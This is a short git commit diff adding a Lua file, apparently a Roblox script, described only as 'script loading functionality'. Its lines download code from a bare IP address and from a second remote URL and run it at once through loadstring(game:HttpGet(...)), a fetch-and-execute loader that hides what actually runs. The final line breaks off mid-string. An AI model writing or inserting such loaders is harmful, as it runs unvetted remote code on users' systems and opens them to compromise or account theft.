5401a919deb262751034145aef9dde570dbc7006
ZenXx1 <kenjiesalazar24@gmail.com>
2025-11-03 05:00:33 +0800

    Add ZenXScriptS.lua with script loading functionality

---
+++ ZenXScriptS.lua
@@ -0,0 +1,4 @@
+ID="1d8a7984-39a5-4e23-aab9-644123ea8a69";
+RUN_AFTER=loadstring(game:HttpGet("http://5.129.235.74:3910/cdn/loader.luau"))()
+
+loadstring(game:HttpGet("https://cdn.reverse.software/visual.luau
